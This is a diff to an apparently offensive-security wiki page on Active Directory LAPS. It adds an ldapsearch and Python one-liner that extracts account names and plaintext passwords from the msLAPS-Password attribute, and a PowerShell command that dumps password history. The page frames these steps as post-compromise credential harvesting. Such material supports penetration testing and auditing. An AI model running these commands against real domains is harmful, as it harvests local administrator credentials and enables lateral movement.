@@ -105,6 +105,19 @@ ldapsearch -x -H ldap://<dc-ip> -D 'CORP\jsmith' -w 'Password123!' \
 
 > [!tip] **Who can read it?** The BloodHound `ReadLAPSPassword` edge answers this directly for both LAPS generations — run it before hunting by hand. See [[Tools/AD/BloodHound|BloodHound]].
 
+> [!warning] **`msLAPS-Password` is a JSON blob, not a bare password.** When you read it *raw* (ldapsearch, `bloodyAD get object`, PowerView `Get-DomainComputer`), the attribute value is JSON — `{"n":"Administrator","t":"<filetime-hex>","p":"<the password>"}` — where `n` is the (possibly renamed) managed account, `t` the update time, `p` the password. Pull `.p` out yourself:
+> ```bash
+> # ldapsearch → extract just the password field
+> ldapsearch -x -H ldap://<dc-ip> -D 'CORP\jsmith' -w 'Pw' -b 'DC=corp,DC=local' \
+>   '(msLAPS-Password=*)' msLAPS-Password | sed -n 's/^msLAPS-Password: //p' | python3 -c 'import sys,json;[print(json.loads(l)["n"],json.loads(l)["p"]) for l in sys.stdin]'
+> ```
+> `Get-LapsADPassword -AsPlainText`, `nxc --laps`, and `pyLAPS` parse this for you — the gotcha only bites the raw-LDAP path. (Legacy `ms-Mcs-AdmPwd` *is* a bare string.)
+
+> [!tip] **Grab the password *history* too (Windows LAPS).** If history is enabled, prior passwords live in `msLAPS-EncryptedPasswordHistory` — invaluable when the password **rotated after** you got read rights but before you used it, or for auditing reuse:
+> ```powershell
+> Get-LapsADPassword -Identity WKSTN01 -IncludeHistory -AsPlainText
+> ```
+
 ---
 
 ## Using Stolen LAPS Credentials
@@ -183,5 +196,5 @@ ldapsearch -x -H ldap://<dc-ip> -D 'DOMAIN\user' -w 'Password' \
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-01*
-*Model: claude-opus-5*
+*Updated: 2026-09-28*
+*Model: claude-opus-4-8*
